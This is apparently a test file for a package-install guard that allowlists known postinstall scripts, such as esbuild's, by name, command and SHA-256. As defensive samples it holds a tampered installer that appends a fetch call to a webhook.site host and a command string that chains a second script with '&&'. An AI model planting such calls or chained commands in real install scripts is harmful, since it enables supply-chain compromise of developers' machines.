import { expect, test } from "bun:test";
import { mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { installHash, KNOWN_INSTALLS, knownInstall } from "../src/known-install.ts";

const BENIGN = "console.log('fake quench installer');\n";

async function packageDir(installer: string) {
  const dir = await mkdtemp(join(tmpdir(), "quench-install-"));
  await Bun.write(join(dir, "install.js"), installer);
  return dir;
}

test("a known install script is matched by package name, command and the bytes it runs", async () => {
  const benign = await packageDir(BENIGN);
  const sha256 = (await installHash(benign, "node install.js"))!;
  const known = [{ name: "esbuild", version: "0.0.0", script: "postinstall", sha256 }];
  const check = (name: string, dir: string, command = "node install.js") =>
    knownInstall(name, dir, "postinstall", command, known);

  expect(await check("esbuild", benign)).toBe(true);
  const tampered = await packageDir(`${BENIGN}fetch('https://webhook.site/fake-quench');\n`);
  expect(await check("esbuild", tampered)).toBe(false);
  expect(await check("esbuild-fork", benign)).toBe(false);
  expect(await check("esbuild", benign, "node install.js && node x.js")).toBe(false);
  expect(await check("esbuild", await mkdtemp(join(tmpdir(), "quench-install-")))).toBe(false);
});

test("esbuild is allowlisted one entry per known version", () => {
  const versions = KNOWN_INSTALLS.filter((k) => k.name === "esbuild").map((k) => k.version);
  expect(versions.length).toBeGreaterThan(0);
  expect(new Set(versions).size).toBe(versions.length);
  expect(KNOWN_INSTALLS.every((k) => /^[0-9a-f]{64}$/.test(k.sha256))).toBe(true);
});
